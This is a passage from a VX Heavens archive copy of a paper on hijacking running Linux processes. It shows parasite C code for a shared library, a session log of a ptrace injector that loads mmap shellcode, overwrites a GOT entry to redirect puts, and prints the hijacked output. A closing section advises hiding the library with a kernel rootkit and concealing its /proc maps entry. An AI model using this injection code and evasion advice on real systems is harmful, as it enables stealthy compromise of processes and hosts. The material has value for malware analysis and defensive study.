&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"movl %%esi,%%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"int $0x80<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span> <span style="color: #ff0000;">"popl %%ebx"</span>:<span style="color: #ff0000;">"=a"</span> <span style="color: black;">(</span>ret<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :<span style="color: #ff0000;">"0"</span> <span style="color: black;">(</span>SYS_write<span style="color: black;">)</span>, <span style="color: #ff0000;">"S"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> fd<span style="color: black;">)</span>,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"c"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> buf<span style="color: black;">)</span>, <span style="color: #ff0000;">"d"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> count<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ret &gt;= <span style="color: #cc66cc;">0</span><span style="color: black;">)</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">int</span><span style="color: black;">)</span> ret;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
&nbsp; <span style="color: #808080; font-style: italic;">/* allocate strings on the stack */</span><br>
&nbsp; <span style="color: #808080; font-style: italic;">/* so they aren't stored in .rodata */</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">char</span> msg<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'I'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">' '</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'a'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'m'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;msg<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">char</span> nl<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;nl<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>= <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span>;<br>
<br>
&nbsp; <span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;<br>
<br>
&nbsp; <span style="color: #808080; font-style: italic;">/* just to demonstrate calling */</span><br>
&nbsp; <span style="color: #808080; font-style: italic;">/* a syscall from our shared lib */</span><br>
&nbsp; _write<span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>msg, <span style="color: #cc66cc;">4</span><span style="color: black;">)</span>;<br>
&nbsp; _write<span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>nl, <span style="color: #cc66cc;">1</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; <span style="color: #808080; font-style: italic;">/* pass our new arg to the original function */</span><br>
&nbsp; origfunc<span style="color: black;">(</span>new_string<span style="color: black;">)</span>;<br>
&nbsp;<br>
&nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; Remember this is an alternative way to transfer control back --<br>
&nbsp; __asm__ __volatile__<br>
&nbsp; ("movl %ebp, %esp\n" "pop %ebp\n" "movl $0x00000000, %eax\n" "jmp *%eax");<br>
&nbsp; */</span><br>
<span style="color: black;">}</span><br>
<br>
<br>
<span style="color: #993333;">void</span><br>
_init <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
<span style="color: #993333;">void</span><br>
_fini <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Here is an example:</p>
<pre class="source">localhost # gcc -fPIC -c libtest.c -nostdlib
localhost # ld -shared -o libtest.so.1.0 libtest.o
localhost # cp libtest.so.1.0 /lib
localhost # gcc dlh.c -o dlh
localhost # ps aux | grep test
root     16651  0.0  0.0   1436   308 pts/25   S+   12:34   0:00 ./test
localhost # ./dlh 16651 puts

%eip -&gt; 0xb7e60e9b
Injecting mmap_shellcode at 0x8048000
Here is the saved code we will be overwriting:

\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00
\x01\x00\x00\x00\x40\x83\x04\x08\x34\x00\x00\x00\x04\x12\x00\x00\x00\x00\x00\x00
\x34\x00\x20\x00\x09\x00\x28\x00\x1d\x00\x1a\x00\x06\x00\x00\x00\x34\x00\x00\x00
\x34\x80\x04\x08\x34\x80\x04\x08\x20\x01\x00\x00\x20\x01\x00\x00\x05\x00\x00\x00
\x04\x00\x00\x00\x03\x00\x00\x00\x54\x01

Verifying shellcode was injected properly, does this look ok?

\xe9\x3b\x00\x00\x00\x31\xc9\xb0\x05\x5b\x31\xc9\xcd\x80\x83\xec\x18\x31\xd2\x89
\x14\x24\xc7\x44\x24\x04\x00\x20\x00\x00\xc7\x44\x24\x08\x07\x00\x00\x00\xc7\x44
\x24\x0c\x02\x00\x00\x00\x89\x44\x24\x10\x89\x54\x24\x14\xb8\x5a\x00\x00\x00\x89
\xe3\xcd\x80\xcc\xe8\xc0\xff\xff\xff\x2f\x6c\x69\x62\x2f\x6c\x69\x62\x74\x65\x73
\x74\x2e\x73\x6f\x2e\x31\x2e\x30\x00\x00

Setting %eip to 0x8048000
%eip is now at 0x8048040, resetting it to 0xb7e60e9b
inserting original code back
Reading from process image at 0xb7f0f000
Searching at library base [0xb7f0f000] for evil function
Printing parasite code -&gt;

55 89 e5 83 ec 18 c6 45 f7 65 c6 45 f8 76 c6 45 f9 69 c6 45
fa 6c c6 45 fb 00 c6 45 f2 49 c6 45 f3 20 c6 45 f4 61 c6 45
f5 6d c6 45 f6 00 c6 45 f1 0a
Evil Function location: b7f0f248
Modifying GOT entry: replace &lt;puts&gt; with b7f0f248
Modifying GOT(804a00c)
Successfully modified GOT entry

New GOT value: b7f0f248
Reading from process image at 0xb7f0f248
55 89 e5 83 ec 18 c6 45 f7 65 c6 45 f8 76 c6 45 f9 69 c6 45 fa 6c c6 45 fb 00
c6 45 f2 49 c6 45 f3 20 c6 45 f4 61 c6 45 f5 6d c6 45 f6 00 c6 45 f1 0a c7
Located transfer code; patching it with b7e2b5c0
Injecting b7e2b5c0 at 0xb7f0f27d
Confirm transfer code: \xfc\xc0\xb5\xe2\xb7\x6a\x04
localhost #

At this point the target process has been hijacked

localhost # ./test
test!
test!
test!
test!
test!
test!
test!
test!
I am
evil
I am
evil
I am
evil
</pre>
<h2><a name="c8"></a>8 - After thoughts</h2>
<h3><a name="c81"></a>1 Improvements</h3>
<p>The method shown in this paper could probably be improved in many ways I have not thought of. The primary thing that come to mind is to provide a more flexible loader that does relocation, and does not require the parasite be compiled without relocations. This could be done especially easy when _dlopen_ was present in libc, and although __libc_dlopen_mode works similarly, I have not studied it enough or spent a whole lot of time trying to get it to work as a loader for a target process, as mmap() suites me. I think ultimately it would be a somewhat trivial task, but as this paper was merely a side step from my real project, it didn't seem worth pursuing since I have more significant projects.</p>
<h4><a name="c82"></a>2 ELFsh</h4>
<p>One other thing to mention is elfsh; elfsh is now apart of eresi -- ELF Reverse Engineering Software Interface. Elfsh is a scripting interpreter that can be used to implement hijackers (among many many other things) like the one in this paper (and more advanced) with very little effort. Check it: <a href="http://www.eresi-project.org/">http://www.eresi-project.org/</a></p>
<h4><a name="c83"></a>3 Staying hidden</h4>
<p>Keep in mind that it is imperative to make sure your shared object is hidden i.e via a kernel rootkit, otherwise its going to be easily found on disk. Additionally, the shared object that you are loading is visible in the /proc/&lt;pid&gt;/maps file and that line should always be hidden as well. Another alternative is of course to directly modify shared objects on the system which has the benefits of not making a mess anywhere else on disk but can be detected via regular md5 checks.</p>
<p>Thank you, and enjoy.</p>
<h2><a name="c9"></a>9 - References / Reading Material</h2>
<ol>
	<li><a href="http://althing.cs.dartmouth.edu/local/subversiveld.pdf">Cheating the ELF</a> by grugq</li>
	<li><a href="http://www.phrack.com/issues.html?issue=56&id=7#article">ELF PLT infection</a> by Silvio</li>
	<li><a href="http://em386.blogspot.com/2006/10/resolving-elf-relocation-name-symbols.html">ELF Relocation explained</a></li>
	<li><a href="http://www.muppetlabs.com/~breadbox/software/ELF.txt">ELF Specification</a></li>
	<li><a href="http://www.phrack.com/issues.html?issue=63&id=9#article">Embedded ELF Debugging</a></li>
	<li><a href="http://s.eresi-project.org/inc/articles/elf-rtld.txt">RTLD internals</a> by Mayhem</li>
	<li><a href="http://linux.die.net/man/2/ptrace">ptrace(2)</a></li>
</ol>
<!-- This file was downloaded from http://vxheavens.com/ -->
</div>
<div class="header">
	 <a href="http://vxheavens.com/">VX Heavens</a>, 1999-2012 <a href="http://download.adamas.ai/dlbase/Stuff/VX%20Heavens%20Library/README.html">README</a>
</div>

</body></html>